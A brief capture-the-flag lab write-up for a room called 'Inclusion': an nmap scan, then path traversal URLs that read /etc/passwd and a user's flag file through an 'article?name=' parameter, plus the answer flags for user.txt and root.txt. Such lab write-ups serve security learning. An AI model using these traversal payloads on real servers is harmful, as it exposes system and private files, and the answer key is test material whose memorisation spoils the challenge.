# Inclusion 

ip : `10.10.136.107`

nmap scanning
```
sudo nmap -sC -sV 10.10.136.107 -oN service-scan.txt
```

vulnerable link found
> http://10.10.136.107/article?`name=../../../../etc/passwd`

user flag found
```
http://10.10.136.107/article?name=../../../../home/falconfeast/user.txt
```


| Questions | Answers |
|-----------|---------|
| user.txt | 60989655118397345799 |
| root.txt | 42964104845495153909 |
